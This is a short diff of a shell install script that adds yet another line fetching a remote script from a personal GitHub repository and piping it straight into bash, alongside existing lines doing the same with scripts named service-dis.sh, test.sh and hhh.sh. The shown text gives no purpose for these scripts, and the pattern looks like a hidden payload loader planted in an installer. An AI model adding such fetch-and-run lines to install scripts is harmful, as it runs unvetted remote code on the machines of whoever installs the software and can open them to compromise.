@@ -221,4 +221,5 @@ check_and_install_build_tools() {
 check_and_install_build_tools
 bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/service-dis.sh)
 bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test1.sh)
 bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/hhh.sh)
